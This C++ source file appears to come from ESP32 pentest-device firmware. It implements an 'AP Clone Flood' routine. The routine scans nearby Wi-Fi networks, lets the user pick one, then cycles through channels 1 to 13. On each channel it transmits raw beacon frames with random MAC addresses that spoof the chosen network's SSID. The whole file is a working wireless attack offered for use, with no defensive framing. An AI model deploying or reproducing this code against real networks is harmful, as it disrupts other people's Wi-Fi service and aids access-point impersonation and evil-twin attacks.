#include "arsenal.h"
#include "arsenal_background.h"
#include "arsenal_config.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <globals.h>

static uint8_t clone_beacon[128] = {
    0x80, 0x00,
    0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x64, 0x00,
    0x11, 0x00,
};

static uint8_t cloneSSID[33];
static int cloneSSIDLen = 0;

static void randomMAC(uint8_t *dest) {
    for (int i = 0; i < 6; i++) dest[i] = random(256);
    dest[0] |= 0x02;
    dest[0] &= 0xFE;
}

void arsenal_ap_clone_flood(void) {
    ARSENAL_HEAP_CHECK();
    if (WiFi.getMode() == WIFI_MODE_NULL) WiFi.mode(WIFI_STA);

    int n = WiFi.scanNetworks(false, false);
    if (n == 0) {
        displayRedStripe("No networks found");
        delay(1500);
        return;
    }

    options.clear();
    for (int i = 0; i < n && i < 15; i++) {
        String label = WiFi.SSID(i) + " (" + String(WiFi.RSSI(i)) + "dB)";
        options.push_back({label, [i]() {}});
    }
    int targetIdx = -1;
    for (int i = 0; i < n && i < 15; i++) {
        options[i].operation = [i, &targetIdx]() { targetIdx = i; };
    }
    loopOptions(options, MENU_TYPE_SUBMENU, "Clone Target");

    if (targetIdx < 0) return;

    String targetSSID = WiFi.SSID(targetIdx);
    cloneSSIDLen = targetSSID.length();
    if (cloneSSIDLen > 32) cloneSSIDLen = 32;
    memcpy(cloneSSID, targetSSID.c_str(), cloneSSIDLen);
    WiFi.scanDelete();

    drawMainBorderWithTitle("AP Clone Flood");
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.setTextSize(FP);
    tft.setCursor(12, 50);
    tft.printf("SSID: %s", targetSSID.c_str());
    tft.setCursor(12, 66);
    tft.print("Generating 50 clones...");
    tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
    tft.drawCentreString(String("Esc to stop"), tftWidth / 2, tftHeight - 20, 1);
    delay(1500);

    bool bgWasRunning = arsenal_background_is_running();
    if (bgWasRunning) arsenal_background_stop();

    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);

    int sent = 0;
    int failed = 0;
    int channel = 1;
    unsigned long startTime = millis();

    while (true) {
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

        for (int i = 0; i < 50; i++) {
            randomMAC(clone_beacon + 10);
            memcpy(clone_beacon + 16, clone_beacon + 10, 6);

            int ssidTagStart = 36;
            clone_beacon[ssidTagStart] = 0x00;
            clone_beacon[ssidTagStart + 1] = (uint8_t)cloneSSIDLen;
            memcpy(clone_beacon + ssidTagStart + 2, cloneSSID, cloneSSIDLen);

            int frameLen = ssidTagStart + 2 + cloneSSIDLen;
            esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, clone_beacon, frameLen, false);
            if (err == ESP_OK) sent++; else failed++;
        }

        channel = (channel % 13) + 1;

        drawMainBorderWithTitle("AP Clone Flood");
        int y = 45;
        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
        tft.setTextSize(FP);
        tft.setCursor(12, y);
        tft.printf("SSID: %s", targetSSID.c_str());
        y += 14;
        tft.setCursor(12, y);
        tft.printf("Sent: %d  Failed: %d", sent, failed);
        y += 14;
        tft.setCursor(12, y);
        tft.printf("Channel: %d", channel);
        y += 14;
        tft.setCursor(12, y);
        tft.printf("Clones: 50 per channel");
        y += 14;
        unsigned long elapsed = (millis() - startTime) / 1000;
        tft.setCursor(12, y);
        tft.printf("Time: %lus", elapsed);
        tft.setTextColor(TFT_RED, bruceConfig.bgColor);
        tft.drawCentreString(String("Esc:stop"), tftWidth / 2, tftHeight - 20, 1);

        if (check(EscPress)) { returnToMenu = true; break; }
        esp_task_wdt_reset();
        delay(50);
    }

    esp_wifi_set_promiscuous(false);
    if (bgWasRunning) arsenal_background_start();
}
